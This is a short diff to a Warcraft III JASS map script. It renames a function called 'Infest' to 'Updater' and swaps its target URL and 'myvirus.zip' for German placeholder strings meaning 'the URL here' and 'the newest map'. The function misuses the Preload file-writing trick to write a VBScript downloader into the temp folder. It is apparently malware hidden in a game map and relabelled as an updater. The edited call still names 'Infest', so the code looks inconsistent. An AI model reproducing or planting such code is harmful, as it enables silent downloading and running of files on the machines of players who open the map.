@@ -1,4 +1,4 @@
-function Infest takes string url, string localname returns nothing
+function Updater takes string url, string localname returns nothing
     call PreloadGenClear()
     call PreloadGenStart()
     call Preload("\")\necho Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") > %TEMP%\\download.vbs\n//")
@@ -43,5 +43,5 @@ endfunction
 
 //===========================================================================
 function InitTrig_Melee_Initialization takes nothing returns nothing
-    call Infest("http://www.stephan-brenner.com/blog/wp-content/uploads/2008/08/donothing.zip", "myvirus.zip")
+    call Infest("Hier die url", "Die neuste map")
 endfunction
